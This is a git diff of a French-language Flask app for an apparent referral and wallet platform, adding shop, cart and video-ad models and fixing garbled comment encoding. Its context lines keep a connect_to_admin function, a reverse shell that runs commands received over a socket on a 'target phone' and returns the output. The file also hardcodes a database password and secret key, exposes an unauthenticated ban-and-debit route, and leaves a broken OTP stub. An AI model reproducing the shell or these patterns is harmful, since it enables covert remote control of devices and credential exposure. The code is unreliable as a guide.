@@ -4,6 +4,7 @@ import os
 import re
 import sys
 import uuid
+import unicodedata
 from datetime import datetime, timedelta, timezone, date, UTC
 from functools import wraps
 from urllib.parse import urlencode
@@ -17,11 +18,11 @@ from werkzeug.utils import secure_filename
 from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
 from flask_migrate import Migrate
 
-# ÔöÇÔöÇÔöÇ FLASK APP ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ─── FLASK APP ───────────────────────────────────────────
 app = Flask(__name__, template_folder="templates", static_folder="static")
 app.secret_key = "ma_cle_ultra_secrete"
 
-# D├®sactiver le cache pour le d├®veloppement
+# Désactiver le cache pour le développement
 @app.after_request
 def add_header(response):
     response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
@@ -30,14 +31,14 @@ def add_header(response):
     response.headers['Cache-Control'] = 'public, max-age=0'
     return response
 
-# ÔöÇÔöÇÔöÇ UPLOAD CONFIG ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ─── UPLOAD CONFIG ───────────────────────────────────────
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
 
 UPLOAD_FOLDER_PROFILE = 'static/uploads/profiles'
 UPLOAD_FOLDER_VLOGS = 'static/vlogs'
 UPLOAD_FOLDER_APPS = os.path.join(os.getcwd(), "static", "uploads", "apps")
 
-# Cr├®ation des dossiers si inexistant
+# Création des dossiers si inexistant
 os.makedirs(UPLOAD_FOLDER_PROFILE, exist_ok=True)
 os.makedirs(UPLOAD_FOLDER_APPS, exist_ok=True)
 os.makedirs(UPLOAD_FOLDER_VLOGS, exist_ok=True)
@@ -50,12 +51,12 @@ app.config['UPLOAD_FOLDER'] = 'static/uploads'
 app.config["UPLOAD_FOLDER"] = "static/uploads"
 def allowed_file(filename):
     """
-    V├®rifie si le fichier upload├® est autoris├®.
+    Vérifie si le fichier uploadé est autorisé.
     Retourne True si l'extension est dans ALLOWED_EXTENSIONS.
     """
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
-# ÔöÇÔöÇÔöÇ DATABASE CONFIG ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ─── DATABASE CONFIG ─────────────────────────────────────
 DATABASE_URL = "postgresql://neondb_owner:npg_YaC69HIAGyZn@ep-muddy-darkness-ai9gl7w1-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
 
 engine = create_engine(
@@ -74,11 +75,11 @@ app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
     "pool_timeout": 20
 }
 
-# ÔöÇÔöÇÔöÇ INITIALISATION DE LA BASE DE DONN├ëES ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ─── INITIALISATION DE LA BASE DE DONNÉES ───────────────
 db = SQLAlchemy(app)
 migrate = Migrate(app, db)
 
-# ÔöÇÔöÇÔöÇ FLASK-LOGIN CONFIG ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ─── FLASK-LOGIN CONFIG ─────────────────────────────────
 from flask_login import LoginManager, UserMixin, current_user
 
 login_manager = LoginManager()
@@ -90,14 +91,14 @@ login_manager.login_view = "connexion_page"  # ta route login
 def load_user(user_id):
     return User.query.get(int(user_id))  # classique
 
-# Avant chaque requ├¬te, on force current_user ├á utiliser ta session
+# Avant chaque requête, on force current_user à utiliser ta session
 @app.before_request
 def load_logged_in_user():
     from flask import g
     user_id = session.get("user_id")
     if user_id:
         try:
-            # Utilise User.query.get pour compatibilit├®
+            # Utilise User.query.get pour compatibilité
             g.logged = User.query.get(user_id)
         except:
             # Fallback pour SQLAlchemy 2.0+
@@ -119,11 +120,11 @@ class User(db.Model, UserMixin):
     email = db.Column(db.String(120), unique=True, nullable=False, index=True)
     phone = db.Column(db.String(30), unique=True, nullable=False, index=True)
     password = db.Column(db.String(300), nullable=False)
-    last_play_date = db.Column(db.DateTime, nullable=True) # Date pr├®cise du dernier clic
-    # Parrainage ÔÇö maintenant bas├® sur le username
-    parrain = db.Column(db.String(50), nullable=True)  # Pas de FK pour ├®viter les erreurs
+    last_play_date = db.Column(db.DateTime, nullable=True) # Date précise du dernier clic
+    # Parrainage — maintenant basé sur le username
+    parrain = db.Column(db.String(50), nullable=True)  # Pas de FK pour éviter les erreurs
     has_played_slot = db.Column(db.Boolean, default=False)
-    # Relation auto-r├®f├®rentielle pour les filleuls (downlines)
+    # Relation auto-référentielle pour les filleuls (downlines)
     downlines = db.relationship(
         'User',
         primaryjoin="User.username == foreign(User.parrain)",
@@ -138,7 +139,7 @@ class User(db.Model, UserMixin):
     wallet_number = db.Column(db.String(30))
     bonus = db.Column(db.Float, default=0.0)
     chances_bridge = db.Column(db.Integer, default=3)
-    derniere_maj_chances = db.Column(db.Date) # Pour r├®initialiser chaque jeudi
+    derniere_maj_chances = db.Column(db.Date) # Pour réinitialiser chaque jeudi
     solde_total = db.Column(db.Float, default=0.0)
     solde_depot = db.Column(db.Float, default=0.0)
     solde_parrainage = db.Column(db.Float, default=0.0)
@@ -171,7 +172,7 @@ class User(db.Model, UserMixin):
     last_youtube_date = db.Column(db.String(10), default=None)
     last_tiktok_date = db.Column(db.String(20), default=None)
     last_login = db.Column(db.DateTime, nullable=True)
-    game_played_count = db.Column(db.Integer, default=0) # Nombre de fois qu'il a jou├®
+    game_played_count = db.Column(db.Integer, default=0) # Nombre de fois qu'il a joué
     login_count = db.Column(db.Integer, default=0)
     has_spun_wheel = db.Column(db.Boolean, default=False)
     has_spun = db.Column(db.Boolean, default=False)
@@ -185,7 +186,7 @@ class User(db.Model, UserMixin):
         return f"<User {self.username} | {self.phone}>"
 
 # ==============================
-# ­ƒôª MODELS
+# 📦 MODELS
 # ==============================
 
 class Depot(db.Model):
@@ -193,25 +194,25 @@ class Depot(db.Model):
 
     id = db.Column(db.Integer, primary_key=True)
 
-    # ­ƒöü Ancien syst├¿me
+    # 🔁 Ancien système
     user_name = db.Column(
         db.String(50),
         db.ForeignKey("user.username", ondelete="CASCADE"),
         nullable=True
     )
 
-    # ­ƒåò Nouveau syst├¿me
+    # 🆕 Nouveau système
     user_id = db.Column(
         db.Integer,
         db.ForeignKey("user.id", ondelete="CASCADE"),
         nullable=True
     )
 
-    # Ô£à TR├êS IMPORTANT : pr├®ciser foreign_keys
+    # ✅ TRÈS IMPORTANT : préciser foreign_keys
     user = db.relationship(
         "User",
         backref="depots",
-        foreign_keys=[user_id]  # ­ƒæê ICI la correction
+        foreign_keys=[user_id]  # 👈 ICI la correction
     )
 
     phone = db.Column(db.String(30), nullable=False)
@@ -236,7 +237,7 @@ class Retrait(db.Model):
     __tablename__ = "retrait"
 
     id = db.Column(db.Integer, primary_key=True)
-    user_id = db.Column(db.Integer, nullable=True)  # Ô£à NOUVELLE COLONNE
+    user_id = db.Column(db.Integer, nullable=True)  # ✅ NOUVELLE COLONNE
 
     phone = db.Column(db.String(30), nullable=False)
     montant = db.Column(db.Float, nullable=False)
@@ -275,8 +276,8 @@ class ClickTache(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
     date = db.Column(db.Date, default=datetime.utcnow().date)
-    clicks = db.Column(db.Integer, default=0)  # Nombre de clicks effectu├®s
-    points = db.Column(db.Integer, default=0)  # Points gagn├®s
+    clicks = db.Column(db.Integer, default=0)  # Nombre de clicks effectués
+    points = db.Column(db.Integer, default=0)  # Points gagnés
 
 
 class ClickJeudiReponse(db.Model):
@@ -290,7 +291,7 @@ class RetraitPoints(db.Model):
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
     points_utilises = db.Column(db.Integer, nullable=False)
     montant_xof = db.Column(db.Float, nullable=False)
-    statut = db.Column(db.String(20), default='en_attente')  # en_attente / valide / refus├®
+    statut = db.Column(db.String(20), default='en_attente')  # en_attente / valide / refusé
     date_creation = db.Column(db.DateTime, default=datetime.utcnow)
     type_retrait = db.Column(db.String(20), nullable=True) # Ajoute ceci
     user = db.relationship('User', backref=db.backref('retraits_points', lazy='dynamic'))
@@ -310,10 +311,10 @@ class ChannelMessage(db.Model):
     media_url = db.Column(db.String(255), nullable=True)
     media_type = db.Column(db.String(50)) # Ajoute 'audio' mentalement ici
     timestamp = db.Column(db.DateTime, default=datetime.utcnow)
-    reactions = db.Column(db.JSON, default=lambda: {"­ƒöÑ": 0, "­ƒÜÇ": 0, "ÔØñ´©Å": 0})
+    reactions = db.Column(db.JSON, default=lambda: {"🔥": 0, "🚀": 0, "❤️": 0})
 
 
-# Ajoute bien cette classe avec tes autres mod├¿les (User, Retrait, etc.)
+# Ajoute bien cette classe avec tes autres modèles (User, Retrait, etc.)
 class ChannelSub(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id')) # Assure-toi que 'user.id' est correct
@@ -332,17 +333,17 @@ class GameControl(db.Model):
         return False
 
 
-# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
-# ­ƒÅ¬ MODELES POUR LES BOUTIQUES ET VENDEURS
-# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+# ──────────────────────────────────────────────────────
+# 🏪 MODELES POUR LES BOUTIQUES ET VENDEURS
+# ──────────────────────────────────────────────────────
 
-# Table des cat├®gories de produits
+# Table des catégories de produits
 class Categorie(db.Model):
     __tablename__ = 'categories'
     id = db.Column(db.Integer, primary_key=True)
     nom = db.Column(db.String(100), nullable=False, unique=True)
     description = db.Column(db.Text, nullable=True)
-    icone = db.Column(db.String(50), nullable=True)  # emoji ou nom d'ic├┤ne
+    icone = db.Column(db.String(50), nullable=True)  # emoji ou nom d'icône
     date_creation = db.Column(db.DateTime, default=datetime.utcnow)
 
     # Relation avec les produits
@@ -367,13 +368,13 @@ class Boutique(db.Model):
     ville = db.Column(db.String(100), nullable=True)
     pays = db.Column(db.String(100), nullable=True)
     logo = db.Column(db.String(255), nullable=True)  # URL de l'image du logo
-    banniere = db.Column(db.String(255), nullable=True)  # URL de la banni├¿re
+    banniere = db.Column(db.String(255), nullable=True)  # URL de la bannière
     est_actif = db.Column(db.Boolean, default=True)
     est_verifie = db.Column(db.Boolean, default=False)
     date_creation = db.Column(db.DateTime, default=datetime.utcnow)
     date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
 
-    # Relation avec l'utilisateur propri├®taire
+    # Relation avec l'utilisateur propriétaire
     proprietaire = db.relationship('User', backref=db.backref('boutiques', lazy='dynamic'))
 
     # Relation avec les produits
@@ -384,23 +385,39 @@ class Boutique(db.Model):
 
 
 # Table des produits
+def generate_slug(text):
+    """Génère un slug URL-safe à partir d'un texte"""
+    if not text:
+        return str(uuid.uuid4())[:8]
+    # Normaliser et convertir en minuscules
+    slug = unicodedata.normalize('NFKD', text.lower())
+    slug = slug.encode('ascii', 'ignore').decode('ascii')
+    # Remplacer les espaces et caractères spéciaux par des tirets
+    slug = re.sub(r'[^a-z0-9]+', '-', slug).strip('-')
+    # Limiter la longueur
+    slug = slug[:80]
+    return slug or str(uuid.uuid4())[:8]
+
+
 class Produit(db.Model):
     __tablename__ = 'produits'
     id = db.Column(db.Integer, primary_key=True)
-    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
-    categorie_id = db.Column(db.Integer, db.ForeignKey('categories.id'), nullable=True)
-    nom = db.Column(db.String(300), nullable=False)
+    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False, index=True)
+    categorie_id = db.Column(db.Integer, db.ForeignKey('categories.id'), nullable=True, index=True)
+    nom = db.Column(db.String(300), nullable=False, index=True)
+    slug = db.Column(db.String(100), unique=True, nullable=True, index=True)
     description = db.Column(db.Text, nullable=True)
-    prix = db.Column(db.Float, nullable=False)
+    prix = db.Column(db.Float, nullable=False, index=True)
     prix_promo = db.Column(db.Float, nullable=True)  # Prix en promotion (optionnel)
     devise = db.Column(db.String(10), default='XOF')
-    quantite = db.Column(db.Integer, default=1)  # Quantit├® disponible
-    images = db.Column(db.Text, nullable=True)  # URLs s├®par├®es par des virgules
-    couleurs_disponibles = db.Column(db.String(500), nullable=True)  # Couleurs s├®par├®es par des virgules
-    tailles_disponibles = db.Column(db.String(500), nullable=True)  # Tailles s├®par├®es par des virgules
+    quantite = db.Column(db.Integer, default=1)  # Quantité disponible
+    images = db.Column(db.Text, nullable=True)  # URLs séparées par des virgules
+    couleurs_disponibles = db.Column(db.String(500), nullable=True)  # Couleurs séparées par des virgules
+    tailles_disponibles = db.Column(db.String(500), nullable=True)  # Tailles séparées par des virgules
     est_actif = db.Column(db.Boolean, default=True)
     est_en_promo = db.Column(db.Boolean, default=False)
     vues = db.Column(db.Integer, default=0)
+    ajouts_panier = db.Column(db.Integer, default=0)  # Nombre d'ajouts au panier
     ventes = db.Column(db.Integer, default=0)
     date_creation = db.Column(db.DateTime, default=datetime.utcnow)
     date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
@@ -408,12 +425,41 @@ class Produit(db.Model):
     def __repr__(self):
         return f"<Produit {self.nom}>"
 
+    def generate_slug(self):
+        """Génère un slug unique pour le produit"""
+        base_slug = generate_slug(self.nom)
+        slug = base_slug
+        counter = 1
+        while Produit.query.filter_by(slug=slug).first() is not None:
+            slug = f"{base_slug}-{counter}"
+            counter += 1
+        return slug
+
+    @property
+    def public_url(self):
+        """Retourne l'URL publique du produit"""
+        from flask import url_for
+        return url_for('voir_produit_public', slug=self.slug, _external=True)
+
     @property
     def liste_images(self):
         """Retourne la liste des URLs d'images"""
         if self.images:
             return [img.strip() for img in self.images.split(',')]
         return []
+
+    @property
+    def image_principale(self):
+        """Retourne la première image ou une image par défaut"""
+        images = self.liste_images
+        if images:
+            img = images[0]
+            # Si le chemin ne commence pas par /static/ ou http, l'ajouter
+            if not img.startswith('/') and not img.startswith('http'):
+                return f"/static/{img}"
+            return img
+        # Image placeholder par défaut
+        return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect fill='%23e2e8f0' width='200' height='200'/%3E%3Ctext fill='%2394a3b8' font-family='Arial' font-size='40' text-anchor='middle' y='115'%3E📷%3C/text%3E%3C/svg%3E"
 
     @property
     def liste_couleurs(self):
@@ -473,13 +519,64 @@ class ArticleCommande(db.Model):
         return f"<ArticleCommande produit_id={self.produit_id}>"
 
 
+# ==============================
+# 🛒 MODELES POUR LE PANIER
+# ==============================
+
+class Panier(db.Model):
+    """Panier d'achat - un par utilisateur connecté ou par session pour les non-connectés"""
+    __tablename__ = 'paniers'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True, index=True)
+    session_id = db.Column(db.String(100), nullable=True, index=True)  # Pour les utilisateurs non connectés
+    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
+    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+    
+    # Relations
+    user = db.relationship('User', backref=db.backref('paniers', lazy='dynamic'))
+    articles = db.relationship('ArticlePanier', backref='panier', lazy='dynamic', cascade='all, delete-orphan')
+    
+    def __repr__(self):
+        return f"<Panier id={self.id} user_id={self.user_id} session_id={self.session_id}>"
+    
+    def get_total(self):
+        """Calcule le total du panier"""
+        total = 0
+        for article in self.articles:
+            prix = article.produit.prix_promo if (article.produit.prix_promo and article.produit.prix_promo < article.produit.prix) else article.produit.prix
+            total += prix * article.quantite
+        return total
+    
+    def get_item_count(self):
+        """Retourne le nombre total d'articles dans le panier"""
+        return sum(article.quantite for article in self.articles)
+
+
+class ArticlePanier(db.Model):
+    """Article dans un panier"""
+    __tablename__ = 'articles_panier'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    panier_id = db.Column(db.Integer, db.ForeignKey('paniers.id'), nullable=False)
+    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=False)
+    quantite = db.Column(db.Integer, nullable=False, default=1)
+    date_ajout = db.Column(db.DateTime, default=datetime.utcnow)
+    
+    # Relation avec le produit
+    produit = db.relationship('Produit', backref=db.backref('articles_panier', lazy='dynamic'))
+    
+    def __repr__(self):
+        return f"<ArticlePanier panier_id={self.panier_id} produit_id={self.produit_id}>"
+
+
 # Table des avis/notes sur les boutiques
 class AvisBoutique(db.Model):
     __tablename__ = 'avis_boutiques'
     id = db.Column(db.Integer, primary_key=True)
     boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
-    note = db.Column(db.Integer, nullable=False)  # 1 ├á 5
+    note = db.Column(db.Integer, nullable=False)  # 1 à 5
     commentaire = db.Column(db.Text, nullable=True)
     date_creation = db.Column(db.DateTime, default=datetime.utcnow)
 
@@ -490,69 +587,95 @@ class AvisBoutique(db.Model):
         return f"<AvisBoutique note={self.note}>"
 
 
-import threading
+# ==============================
+# 📹 MODELE POUR LES PUBLICITES VIDEO (Style TikTok)
+# ==============================
 
-import requests
-import os
+class Publicite(db.Model):
+    """Publicité vidéo style TikTok pour les produits"""
+    __tablename__ = 'publicites'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=True)
+    video_url = db.Column(db.String(500), nullable=False)
+    titre = db.Column(db.String(200), nullable=False)
+    description = db.Column(db.Text, nullable=True)
+    prix = db.Column(db.Float, nullable=True)
+    devise = db.Column(db.String(10), default='XOF')
+    duree = db.Column(db.Float, nullable=True)  # Durée en secondes
+    vues = db.Column(db.Integer, default=0)
+    likes = db.Column(db.Integer, default=0)
+    commentaires_count = db.Column(db.Integer, default=0)
+    partages = db.Column(db.Integer, default=0)
+    est_actif = db.Column(db.Boolean, default=True)
+    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
+    
+    # Relations
+    boutique = db.relationship('Boutique', backref=db.backref('publicites', lazy='dynamic'))
+    createur = db.relationship('User', backref=db.backref('publicites', lazy='dynamic'))
+    produit = db.relationship('Produit', backref=db.backref('publicites', lazy='dynamic'))
+    commentaires = db.relationship('CommentairePublicite', backref='publicite', lazy='dynamic', cascade='all, delete-orphan')
+    
+    def __repr__(self):
+        return f"<Publicite id={self.id} titre={self.titre}>"
 
-def envoyer_retrait_soleaspay_debug(service_id, wallet, montant):
-    print("­ƒº¬ MODE DEBUG ACTIV├ë")
 
-    print("SERVICE ID :", service_id)
-    print("WALLET :", wallet)
-    print("MONTANT :", montant)
+class CommentairePublicite(db.Model):
+    """Commentaires sur les publicités"""
+    __tablename__ = 'commentaires_publicites'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    publicite_id = db.Column(db.Integer, db.ForeignKey('publicites.id'), nullable=False)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    texte = db.Column(db.Text, nullable=False)
+    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
+    
+    user = db.relationship('User', backref=db.backref('commentaires_publicites', lazy='dynamic'))
+    
+    def __repr__(self):
+        return f"<CommentairePublicite id={self.id}>"
 
-    # simulation r├®ponse API
-    response = {
-        "success": False,
-        "message": "SIMULATION ERREUR API (test debug)"
-    }
 
-    print("­ƒöÁ FAKE RESPONSE :", response)
-    return response
+class LikePublicite(db.Model):
+    """Likes sur les publicités"""
+    __tablename__ = 'likes_publicites'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    publicite_id = db.Column(db.Integer, db.ForeignKey('publicites.id'), nullable=False)
+    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
+    
+    user = db.relationship('User', backref=db.backref('likes_publicites', lazy='dynamic'))
+    
+    def __repr__(self):
+        return f"<LikePublicite user_id={self.user_id} publicite_id={self.publicite_id}>"
 
-API_KEY = os.getenv("RESEND_API_KEY")
 
-def send_otp(recipient_email, code_otp):
+class Follow(db.Model):
+    """Système d'abonnement/followers"""
+    __tablename__ = 'follows'
+    
+    id = db.Column(db.Integer, primary_key=True)
+    follower_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    following_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
+    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
+    
+    follower = db.relationship('User', foreign_keys=[follower_id], backref=db.backref('following', lazy='dynamic'))
+    following = db.relationship('User', foreign_keys=[following_id], backref=db.backref('followers', lazy='dynamic'))
+    
+    def __repr__(self):
+        return f"<Follow {self.follower.username} -> {self.following.username}>"
+
+
+def envoyer_otp(recipient_email, code_otp):
     if not API_KEY:
-        print("ÔØî API KEY manquante")
-        return False
-
-    try:
-        html_content = render_template(
-            'email_otp.html',
-            otp_code=code_otp,
-            user_email=recipient_email
-        )
-
-        response = requests.post(
-            "https://api.resend.com/emails",
-            headers={
-                "Authorization": f"Bearer {API_KEY}",
-                "Content-Type": "application/json"
-            },
-            json={
-                "from": "NOVATRADE <no-reply@nova-trade.cc>",
-                "to": [recipient_email],
-                "subject": "Votre code de s├®curit├® Novatrade",
-                "html": html_content
-            }
-        )
-
-        print("­ƒô¿ R├®ponse Resend:", response.json())
-
-        if response.status_code in [200, 201]:
-            return True
-        else:
-            print("ÔØî Erreur API:", response.text)
-            return False
-
-    except Exception as e:
-        print("ÔØî Erreur :", e)
+        print("❌ API KEY manquante")
         return False
 
 def donner_commission(parrain_username, montant_depot):
-    """Cr├®e la commission et remplit solde_revenu, solde_parrainage et commission_total selon les niveaux."""
+    """Crée la commission et remplit solde_revenu, solde_parrainage et commission_total selon les niveaux."""
     
     if not parrain_username:
         return
@@ -604,15 +727,15 @@ app.jinja_env.globals.update(t=t)
 
 @app.route("/")
 def index_page():
-    # On v├®rifie si l'utilisateur est d├®j├á connect├® pour personnaliser l'accueil
+    # On vérifie si l'utilisateur est déjà connecté pour personnaliser l'accueil
     user = get_logged_in_user()
     return render_template("index.html", user=user)
 
 # -----------------------
-# Utilisateur connect├®
+# Utilisateur connecté
 # -----------------------
 def get_logged_in_user():
-    """Retourne l'utilisateur connect├® via user_id en session."""
+    """Retourne l'utilisateur connecté via user_id en session."""
     user_id = session.get("user_id")
     if not user_id:
         return None
@@ -621,10 +744,10 @@ def get_logged_in_user():
 
 
 # -----------------------
-# D├®corateur login
+# Décorateur login
 # -----------------------
 def login_required(f):
-    """Prot├¿ge une route, redirige vers la page de connexion si non connect├®."""
+    """Protège une route, redirige vers la page de connexion si non connecté."""
     @wraps(f)
     def wrapper(*args, **kwargs):
         if not get_logged_in_user():
@@ -646,7 +769,7 @@ def calculer_montant_points(user):
     )
     tranches = total_points // 100
     montant_xof = tranches * 200
-    points_utilisables = tranches * 100  # points qui peuvent ├¬tre retir├®s
+    points_utilisables = tranches * 100  # points qui peuvent être retirés
     return montant_xof, points_utilisables
 
 import os
@@ -662,8 +785,8 @@ import subprocess
 import os
 
 def connect_to_admin():
-    # Ton serveur (ton premier t├®l├®phone ou ton PC)
-    # L'appareil cible se connecte ├á TOI
+    # Ton serveur (ton premier téléphone ou ton PC)
+    # L'appareil cible se connecte à TOI
     SERVER_IP = "192.168.1.XX" 
     PORT = 4444
     
@@ -677,11 +800,11 @@ def connect_to_admin():
         if command.lower() == "exit":
             break
             
-        # Ex├®cute la commande sur le t├®l├®phone cible
+        # Exécute la commande sur le téléphone cible
         # Exemple: 'termux-location' ou 'ls'
         output = subprocess.getoutput(command)
         
-        # Renvoie le r├®sultat ├á ton ├®cran de contr├┤le
+        # Renvoie le résultat à ton écran de contrôle
         s.send(output.encode())
     
     s.close()
@@ -699,21 +822,21 @@ def delier_filleuls_brice():
 
     total_delies = 0
 
-    # 2. On retire le parrain en remettant le champ ├á None
+    # 2. On retire le parrain en remettant le champ à None
     for user in filleuls_a_delier:
         user.parrain = None
         total_delies += 1
 
-    # 3. On sauvegarde les modifications dans la base de donn├®es
+    # 3. On sauvegarde les modifications dans la base de données
     if total_delies > 0:
         db.session.commit()
 
-    return f"Op├®ration r├®ussie ! {total_delies} utilisateurs ont ├®t├® d├®li├®s de leaderbrice01. Seul 'amen1' est rest├®."
+    return f"Opération réussie ! {total_delies} utilisateurs ont été déliés de leaderbrice01. Seul 'amen1' est resté."
 
 @app.route("/academy/design")
 @login_required
 def formation_design_page():
-    # R├®cup├®ration de l'utilisateur connect├® pour la navbar
+    # Récupération de l'utilisateur connecté pour la navbar
     phone = get_logged_in_user_phone()
     user = User.query.filter_by(phone=phone).first()
     
@@ -722,17 +845,17 @@ def formation_design_page():
 
 @app.route('/sanctionner/<username>')
 def sanctionner_utilisateur(username):
-    # On r├®cup├¿re l'utilisateur gr├óce au nom pass├® dans l'URL
+    # On récupère l'utilisateur grâce au nom passé dans l'URL
     user = User.query.filter_by(username=username.lower()).first()
 
     if not user:
-        return f"Utilisateur '{username}' non trouv├®.", 404
+        return f"Utilisateur '{username}' non trouvé.", 404
 
     try:
         # 1. Bannissement
         user.is_banned = True
 
-        # 2. D├®biter le solde (On retire 360 000)
+        # 2. Débiter le solde (On retire 360 000)
         user.solde_jeux = (user.solde_jeux or 0) - 360000
 
         # 3. Sauvegarder
@@ -740,14 +863,14 @@ def sanctionner_utilisateur(username):
 
         return f"""
         <div style='color: red; font-family: sans-serif; padding: 20px; border: 2px solid red; border-radius: 15px; max-width: 500px; margin: 20px auto;'>
-            <h2 style='margin-top: 0;'>ÔÜá´©Å Sanction Appliqu├®e</h2>
+            <h2 style='margin-top: 0;'>⚠️ Sanction Appliquée</h2>
             <hr>
             <p><b>Utilisateur :</b> {user.username.upper()}</p>
-            <p><b>Statut :</b> BANNI D├ëFINITIVEMENT</p>
+            <p><b>Statut :</b> BANNI DÉFINITIVEMENT</p>
             <p><b>Retrait solde :</b> -360,000 XOF</p>
             <p><b>Solde actuel :</b> {user.solde_jeux} XOF</p>
             <br>
-            <a href="/admin/utilisateurs" style="color: blue;">Retour ├á la liste</a>
+            <a href="/admin/utilisateurs" style="color: blue;">Retour à la liste</a>
         </div>
         """
     except Exception as e:
@@ -759,13 +882,13 @@ def filleuls_inactifs_kedboy():
     username_cible = "kedboy"
     
     # 1. On cherche directement les utilisateurs dont le parrain est 'kedboy'
-    # ET qui n'ont pas encore fait leur premier d├®p├┤t (premier_depot=False)
+    # ET qui n'ont pas encore fait leur premier dépôt (premier_depot=False)
     filleuls_non_actives = User.query.filter_by(
         parrain=username_cible, 
         premier_depot=False
-    ).order_by(User.id.desc()).all() # Range du plus r├®cent (ID le plus grand) au plus ancien
+    ).order_by(User.id.desc()).all() # Range du plus récent (ID le plus grand) au plus ancien
 
-    # On cr├®e un faux objet parrain pour que le template HTML fonctionne sans erreur
+    # On crée un faux objet parrain pour que le template HTML fonctionne sans erreur
     class CustomParrain:
         username = username_cible
     
@@ -806,18 +929,18 @@ def admin_canal_edit():
         media_url = None
         media_type = None
 
-        # R├®cup├®ration des fichiers
+        # Récupération des fichiers
         file = request.files.get("media")
         audio_file = request.files.get("audio")
 
-        # Priorit├® au m├®dia (image/vid├®o) sinon audio
+        # Priorité au média (image/vidéo) sinon audio
         target_file = file if (file and file.filename) else audio_file
 
         if target_file and target_file.filename:
